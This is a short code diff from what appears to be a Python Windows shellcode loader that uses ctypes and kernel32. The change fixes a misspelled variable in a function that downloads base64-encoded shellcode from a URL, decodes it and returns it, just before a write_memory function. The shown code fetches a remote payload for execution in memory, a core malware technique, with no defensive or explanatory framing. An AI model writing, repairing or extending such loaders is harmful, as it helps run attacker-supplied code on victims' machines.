@@ -7,7 +7,7 @@ kernel32 = ctypes.windll.kernel32
 
 def get_code(url):
     with request.urlopen(url) as response:
-        sehllcode = base64.decodebytes(response.read())
+        shellcode = base64.decodebytes(response.read())
     return shellcode
 
 def write_memory(buf):
